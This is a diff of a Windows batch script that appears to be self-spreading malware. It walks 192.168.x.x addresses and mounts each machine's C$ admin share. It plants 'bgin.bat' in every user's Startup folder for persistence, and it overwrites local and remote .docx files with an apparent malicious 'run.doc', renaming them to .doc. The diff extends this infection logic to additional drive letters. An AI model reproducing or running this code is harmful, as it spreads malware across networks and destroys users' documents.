@@ -2,13 +2,23 @@
 SET ii=1
 SET i=0
 :run
-net use X: \\192.168.%i%.%ii%\C$
-if exist X: (for /f %%x in ('dir X:\Users /b') do mkdir "X:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-if exist X: (for /f %%u in ('dir X:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "X:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
-if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h"
+pushd \\192.168.%i%.%ii%\C$
+if exist X: (for /f %%x in ('dir X:\Users /b') do mkdir "X:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist X: (for /f %%u in ('dir X:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "X:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h")
 for /R "X:" %%f in (*.docx) do ren "%%f" *.doc
-if exist X: (for /f "delims=" %%h in ('dir X:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h"
-net use X: /delete))))
+if exist X: (for /f "delims=" %%h in ('dir X:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h")
+if exist Y: (for /f %%x in ('dir Y:\Users /b') do mkdir "Y:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist Y: (for /f %%u in ('dir Y:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Y:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h")
+for /R "Y:" %%f in (*.docx) do ren "%%f" *.doc
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h")
+if exist Z: (for /f %%x in ('dir Z:\Users /b') do mkdir "Z:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
+for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
+popd
 if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
 for /R "D:" %%f in (*.docx) do ren "%%f" *.doc)
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
